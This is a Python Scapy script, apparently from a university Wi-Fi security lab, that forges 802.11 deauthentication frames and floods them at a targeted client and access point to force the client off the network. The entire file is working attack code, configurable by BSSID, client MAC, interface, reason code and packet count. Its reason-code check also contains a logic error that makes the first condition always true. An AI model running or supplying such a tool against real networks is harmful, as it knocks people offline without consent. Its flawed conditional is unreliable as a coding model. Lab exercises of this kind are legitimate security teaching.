# Auteurs    : Dylan Canton & Christian Zaccaria
# Date       : 23.03.2022
# Descriptif : Script permettant de deauthentifier une station connecté près d'un AP
# Entrée     : script1_deauth.py -n <NUMBER> -a <BSSID> -c <Client> -i <INTERFACE> -r <REASON_CODE>
# Source     : https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py

from scapy.all import *
import argparse

# Param nécessaire (à remplir) permettant de lancer l'attaque
parser = argparse.ArgumentParser(prog="Scapy deauth", description="Deauth station for SWI LAB")

parser.add_argument("-n", "--Number", required=True, help="Number of packets to send")
parser.add_argument("-a", "--BSSID", required=True, help="BSSID of AP")
parser.add_argument("-c", "--Client", required=True, help="Client to deauth MAC")
parser.add_argument("-i", "--Interface", required=True, help="Interface who send attack")
parser.add_argument("-r", "--Code", required=True, help="Reason Code for packets which sent.", choices=['1', '4', '5', '8'])
tab_args = parser.parse_args()

conf.verb = 0

# Reason code envoyé par l'AP au client
if int(tab_args.Code) == 1 or 4 or 5:
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=tab_args.Client, addr2=tab_args.BSSID, addr3=tab_args.BSSID) / Dot11Deauth(reason=int(tab_args.Code))

# Reason code envoyl par le client à l'AP    
if int(tab_args.Code) == 8:
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=tab_args.BSSID, addr2=tab_args.Client, addr3=tab_args.Client) / Dot11Deauth(reason=int(tab_args.Code))

# Envoi du nombre défini en paramètre (-n) de paquets de deauthentification
for i in range(int(tab_args.Number)):
	sendp(packet, iface=tab_args.Interface)
	print("Packet send no : " + str(i+1))